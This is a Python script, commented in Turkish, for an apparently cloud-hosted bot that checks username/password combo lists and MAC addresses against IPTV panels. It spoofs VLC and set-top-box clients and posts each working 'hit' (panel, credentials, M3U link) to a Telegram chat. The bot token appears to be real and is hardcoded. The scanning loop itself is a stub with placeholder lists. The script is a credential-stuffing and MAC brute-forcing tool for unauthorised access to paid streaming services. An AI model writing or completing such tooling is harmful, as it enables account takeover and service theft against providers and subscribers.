import os
import time
import threading
import requests
from flask import Flask
from requests.packages.urllib3.exceptions import InsecureRequestWarning

# SSL uyarılarını kapat
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

uygulama = Flask('')

@uygulama.route('/')
def ana_sayfa():
    return "IPTV Botu Aktif ve 7/24 Bulutta Çalışıyor!"

def webi_calistir():
    uygulama.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))

# --- TELEGRAM AYARLARI ---
TOKEN = "9296501081:AAG8COydawvxX-TfAEArbG-SdEtliP6WODM"
CHAT_ID = "-1003901042500"

def telegrama_gonder(mesaj):
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
        veri = {"chat_id": CHAT_ID, "text": mesaj, "parse_mode": "HTML"}
        requests.post(url, data=veri, timeout=10)
    except Exception as hata:
        print(f"[!] Telegram mesajı gönderilemedi: {hata}")

def m3u_tara(panel, kullanici, sifre):
    api_adresi = f"http://{panel}/player_api.php?username={kullanici}&password={sifre}"
    basliklar = {
        'Cookie': 'stb_lang=pt; timezone=America%2FNew_York;',
        'User-Agent': 'VLC/3.0.18 LibVLC/3.0.18',
    }
    try:
        yanit = requests.get(api_adresi, headers=basliklar, timeout=5, verify=False)
        if yanit.status_code == 200 and 'user_info' in yanit.text:
            if '"auth":1' in yanit.text or '"status":"Active"' in yanit.text:
                m3u_linki = f"http://{panel}/get.php?username={kullanici}&password={sifre}&type=m3u_plus"
                mesaj = (
                    f"🔥 <b>M3U HİT BULUNDU! (Bulut)</b>\n"
                    f"🌐 <b>Panel:</b> http://{panel}\n"
                    f"👤 <b>Kullanıcı:</b> <code>{kullanici}</code>\n"
                    f"🔑 <b>Şifre:</b> <code>{sifre}</code>\n"
                    f"🔗 <b>M3U:</b> {m3u_linki}"
                )
                telegrama_gonder(mesaj)
                return True
    except:
        pass
    return False

def mac_tara(panel, mac_adresi):
    mac_url = f"http://{panel}/c/portal.imixs.com/stalker_portal/server/load.php?type=stb&action=handshake&mac={mac_adresi}"
    basliklar = {'User-Agent': 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3'}
    try:
        yanit = requests.get(mac_url, headers=basliklar, timeout=5, verify=False)
        if yanit.status_code == 200 and ('js' in yanit.text or 'token' in yanit.text):
            mesaj = (
                f"🔥 <b>MAC HİT BULUNDU! (Bulut)</b>\n"
                f"🌐 <b>Panel:</b> http://{panel}\n"
                f"📡 <b>MAC:</b> <code>{mac_adresi}</code>"
            )
            telegrama_gonder(mesaj)
            return True
    except:
        pass
    return False

def arka_plan_tarayici():
    print("[*] Bulut Otonom Tarayıcı Başlatıldı...")
    
    # Not: Render'da listeleri doğrudan GitHub'daki dosyalardan okutabilir 
    # veya buraya örnek paneller/combo listeleri ekleyebilirsin.
    # Örnek test listeleri:
    paneller = ["ornekpanel.com:8080"] 
    combolar = []
    mac_listesi = []

    while True:
        try:
            print("[i] Tarama turu dönüyor...")
            # Tarama mantığı burada dönecek
            # GitHub'a yeni liste attığında botun onları çekmesi için raw link kullanılabilir
            
            time.sleep(1800) # 30 dk bekleme
        except Exception as hata:
            print(f"[!] Hata: {hata}")
            time.sleep(60)

if __name__ == '__main__':
    # Flask sunucusunu ayrı bir iş parçacığında (arkada) çalıştır
    is_parcasi = threading.Thread(target=webi_calistir)
    is_parcasi.start()
    
    # Tarayıcı döngüsünü başlat
    arka_plan_tarayici()
